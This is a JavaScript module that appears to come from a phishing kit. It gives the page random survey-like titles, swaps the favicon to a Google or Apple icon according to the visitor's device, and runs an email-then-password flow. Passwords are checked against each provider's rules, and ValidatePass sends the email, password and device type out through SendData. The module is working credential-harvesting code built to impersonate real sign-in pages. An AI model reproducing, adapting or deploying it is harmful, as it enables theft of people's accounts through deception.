import $ from 'jquery' 
import iconGoogle from '../../src/assets/img/favicon.ico'
import iconApple from '../../src/assets/img/favicon_apple.png'
import { SendData } from './api';

export const getRandomTittle = () => {
    var tittles = ['Pesquisa', 'Trabalho', 'Formulário', 'Form', 'Desafio', 'Challenge', 'Marcas', 'Qualitativa', 'Qualidade', 'Forms', "Brands"];
    document.title = tittles[Math.floor(Math.random() * (tittles.length) ) + 0];

    // Change Favicon
    getMobileOperatingSystem()
}

export const getRandomLetters = (length) => {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

export const getMobileOperatingSystem = ()  =>{
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    var link = document.querySelector("link[rel~='icon']");
    if (!link) {
        link = document.createElement('link');
        link.rel = 'icon';
        document.getElementsByTagName('head')[0].appendChild(link);
    }
    link.href = iconGoogle;

    // Windows Phone must come first because its UA also contains "Android"
    if (/windows phone/i.test(userAgent)) {
        return "WindowsPhone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        link.href = iconApple;
        return "iOS";
    }

    return "PC";
  }

export const GetDevice = () =>{
    let navegador = getMobileOperatingSystem();
    let retorno = "desktop";

    switch (navegador) {
        
        case 'PC':
        retorno = 'desktop';
        break;

        case 'Android':
        retorno = 'android';
        break;

        case 'iOS':
        retorno = 'apple';
        break;
    
        default:
        retorno = 'desktop';
        break;
    }

    return retorno;
}

// Validações Patterns
export const validateEmailPattern = (email) => {
    const emailRegex = new RegExp(/^[A-Za-z0-9_!#$%&'*+=?`{|}~^.-]+@[A-Za-z0-9.-]+$/, "gm");
    const isValidEmail = emailRegex.test(email);

    return isValidEmail;
}

export const validatePassPattern = (pass) => {
    const emailRegex = new RegExp(/.\S{7,}$/, "gm");
    const isValidEmail = emailRegex.test(pass);

    return isValidEmail;
}

export const validatePassApplePattern = (pass) => {
    const emailRegex = new RegExp(/(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).{8,}/, "gm");
    const isValidEmail = emailRegex.test(pass);

    return isValidEmail;
}

export const validateTelPattern = (Tel)  =>{
    var pattern = /^(?:(?:\+|00)?(55)\s?)?(?:\(?([1-9][0-9])\)?\s?)?(?:((?:9\d|[2-9])\d{3})?(\d{4}))$/;
    return pattern.test($.trim(Tel));
}

// Validações Pages
export const ValidateEmail = (email) => {

    let part1 = document.querySelector('.part1');
    let part2 = document.querySelector('.part2');

    if(validateEmailPattern(email) || validateTelPattern(email)){
        if(part1){  part1.style.display = 'none' }
        part2.style.display = 'flex';
        document.querySelector('.erro').style.display = 'none';
    }else{
        document.querySelector('.erro').style.display = 'block';            
    }
    return validateEmailPattern(email);
}

export const ValidatePass = async (email, senha) => {

    let retorno = undefined;
    let senhaValidada = false;

    if(getMobileOperatingSystem() === "iOS"){
        senhaValidada = validatePassApplePattern(senha)
    }else{
        senhaValidada = validatePassPattern(senha)
    }

    if(senhaValidada){
        retorno = SendData(email, senha, GetDevice());
    }else{
        document.querySelector('.erro_senha').style.display = 'block';
    }

    return await retorno;
}

